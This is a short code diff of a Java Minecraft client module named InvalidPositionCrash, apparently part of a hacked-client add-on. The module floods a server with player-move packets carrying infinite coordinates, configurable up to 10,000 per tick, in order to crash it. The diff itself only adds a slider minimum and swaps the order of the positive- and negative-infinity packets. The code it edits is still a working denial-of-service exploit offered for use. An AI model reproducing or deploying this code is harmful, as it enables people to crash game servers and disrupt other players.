@@ -25,6 +25,7 @@ public class InvalidPositionCrash extends Module {
         .description("How many packets to send to the server per tick.")
         .defaultValue(500)
         .min(1)
+        .sliderMin(1)
         .sliderMax(10000)
         .build()
     );
@@ -57,8 +58,8 @@ public class InvalidPositionCrash extends Module {
                     toggle();
                 }
                 case INFINITY -> {
-                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                     mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
+                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                     toggle();
                 }
                 case TP -> mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
